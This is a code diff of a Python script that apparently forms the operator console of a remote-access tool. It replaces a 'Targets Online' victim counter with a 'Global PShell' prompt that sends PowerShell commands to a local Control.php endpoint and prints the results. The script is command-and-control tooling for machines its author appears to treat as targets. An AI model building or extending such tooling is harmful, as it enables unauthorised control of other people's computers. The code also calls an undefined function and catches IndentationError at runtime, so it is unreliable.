@@ -1,49 +1,34 @@
+import requests
 import os
 import time
 from termcolor import *
 
-def count_txt_files(folder_path):
-    # احصل على جميع الملفات في المجلد
-    all_files = os.listdir(folder_path)
-    
-    # احتسب عدد ملفات txt
-    txt_files = [file for file in all_files if file.endswith(".txt")]
-    
-    return len(txt_files)
+os.system("clear")
+os.system("figlet -c -f ~/.local/share/fonts/figlet-fonts/3d.flf Global | lolcat")
+os.system("figlet -c -f ~/.local/share/fonts/figlet-fonts/3d.flf  PShell | lolcat")
+print("=" * 40)
 
-def main():
-    folder_path = "."  # استبدل بمسار المجلد الخاص بك
+while True:
+    try:
+        if os.path.exists('Data.io'):
+            os.remove('Data.io')
 
-    # احصل على العدد الأولي للملفات
-    previous_count = count_txt_files(folder_path)
-
-    if previous_count == 0:
-        os.system("clear")
-        os.system(f"figlet -c -f ~/.local/share/fonts/figlet-fonts/3d.flf Targets Data  | lolcat")
+        data = input("PowerShell >>> ")
         print("")
-        x = colored("[+] No Targets Connected!", 'red')
-        print(x)
-        print("")
-        os.system(f"figlet -c -f ~/.local/share/fonts/figlet-fonts/3d.flf 0 | lolcat")
 
-    while True:
-        # احصل على العدد الحالي للملفات
-        current_count = count_txt_files(folder_path)
+        if data.lower() == 'exit':
+            break
 
-        # قارن بين العددين
-        if current_count != previous_count:
-            # إذا كان هناك تغيير، قم بطباعة العدد الجديد
-            os.system("clear")
-            os.system(f"figlet -c -f ~/.local/share/fonts/figlet-fonts/3d.flf Targets Data | lolcat")
-            print("")
-            print(f"Targets Online : ")
-            print("")
-            os.system(f"figlet -c -f ~/.local/share/fonts/figlet-fonts/3d.flf {current_count} | lolcat")
-            # حدث العدد السابق
-            previous_count = current_count
+        response = requests.post(f'http://localhost:8080/Control.php', data={'data': data})
+        X = colored(response.text, 'green')
+        print(X)
+        time.sleep(10)
+        if os.path.exists('Data.io'):
+            os.remove('Data.io')
 
-        # انتظر لبضع ثواني قبل الفحص التالي
-        time.sleep(1)  # يمكنك تعديل هذا حسب احتياجاتك
+    except IndentationError:
+        print("IndentationError occurred, skipping...")
+        continue
 
-if __name__ == "__main__":
-    main()
+if __name__ == '__main__':
+    send_data()
